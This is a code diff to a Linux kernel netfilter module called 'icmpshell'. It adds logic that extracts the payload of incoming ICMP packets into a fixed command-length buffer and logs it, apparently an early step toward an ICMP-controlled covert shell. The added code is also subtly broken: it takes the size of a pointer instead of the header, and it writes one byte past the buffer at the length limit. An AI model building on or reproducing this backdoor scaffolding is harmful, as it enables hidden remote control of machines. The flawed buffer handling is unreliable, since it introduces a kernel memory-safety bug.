@@ -3,11 +3,19 @@
 #include <linux/icmp.h>
 #include <linux/netfilter_ipv4.h>
 
+#define MAX_CMD_LEN 2040
+
 static struct nf_hook_ops nfho;
 static unsigned int icmp_check(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
   struct iphdr *iph;
   struct icmphdr *icmph;
+
+  unsigned char *user_data;
+  unsigned char *tail;
+  unsigned char *i;
+  int j = 0;
+  char skb_string[MAX_CMD_LEN];
 
   iph = ip_hdr(skb);
   icmph = icmp_hdr(skb);
@@ -19,10 +27,32 @@ static unsigned int icmp_check(void *priv, struct sk_buff *skb, const struct nf_
     return NF_ACCEPT;
   }
 
+  user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
+  tail = skb_tail_pointer(skb);
+
+  j = 0;
+  for (i = user_data; i != tail; ++i) {
+    char c = *(char *)i;
+
+    skb_string[j] = c;
+
+    j++;
+
+    if (c == '\0')
+      break;
+
+    if (j == MAX_CMD_LEN) {
+      skb_string[j] = '\0';
+      break;
+    }
+
+  }
+
   printk(KERN_DEBUG
-         "icmpshell: type=%d; code=%d\n",
+         "icmpshell: type=%d; code=%d; data=%s",
          icmph->type,
-         icmph->code);
+         icmph->code,
+         skb_string);
   return NF_ACCEPT;
 }
 
